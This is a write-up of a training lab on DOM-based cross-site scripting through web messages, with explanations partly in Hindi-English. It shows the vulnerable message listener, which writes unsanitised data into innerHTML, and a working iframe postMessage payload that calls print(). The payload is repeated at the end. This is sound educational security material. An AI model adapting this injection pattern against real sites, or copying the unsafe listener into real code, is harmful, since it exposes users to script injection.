# Lab: DOM XSS using Web Messages

![Lab Image](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)

## Objective
This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the `print()` function to be called.

---

## Analysis

### Initial Observation
- **Website Appearance:**
  ![Homepage](../homepage.png)
  - The website includes an exploit server, which can be used to send data to the victim to trigger XSS.

### Inspecting the Code
- **Developer Tools:**
  ![Developer Tools](../lab01/web_developer_tool.png)
  - The JavaScript code responsible for the vulnerability:
    ```javascript
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    });
    ```
  - **Explanation:**
    - An `EventListener` listens for messages.
    - The received message (`e.data`) is directly inserted into the `innerHTML` of the element with the ID `ads`.
  ![ID Ads](../lab01/id_ads.png)

---

## Exploitation

### Using the Exploit Server
To exploit this vulnerability and trigger XSS:

1. **Craft the Payload:**
    ```html
    <iframe src="https://0ad50028030bfb4d8003768b004c002d.web-security-academy.net/" 
            onload="this.contentWindow.postMessage('<img src=1 onerror=print()>', '*')">
    </iframe>
    ```
2. **Explanation:**
    - The `iframe` loads the target site.
    - The `postMessage` method sends a malicious payload (`<img src=1 onerror=print()>`) to the target site.
3. **Result:**
    - The payload triggers the XSS vulnerability, solving the lab.

---

## Some Explain about Payloads: 
- **postMessage(message, targetOrigin) — 2 cheeze leta hai**
1) **message → kya bhejna hai**
 *Yaha:*
 ```bash
 '<img src=1 onerror=print()>'
```
- **Ye tumhara payload hai jo iframe ke andar page ko bheja ja raha hai.**

2) **targetOrigin → kahan bhejna hai**
*Yaha:*
```bash
'*'

```
**Matlab kisi bhi origin pe bhejo, koi fark nahi padta.**

## LAB SOLVED: 
- **And often visiting the /exploit url we can see that the print() fuction is being called:**
![img](../lab01/lab_solved.png)

- **And now deliver exploit to victim and then the lab has been solved**
![img](../lab01/final_solved.png)

## Conclusion
By leveraging the `postMessage` method and the insecure handling of `innerHTML`, we successfully exploited the DOM XSS vulnerability. This highlights the importance of validating and sanitizing user inputs in web applications.



<iframe src="https://0a7200bd0434bb86808903a900f100e4.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">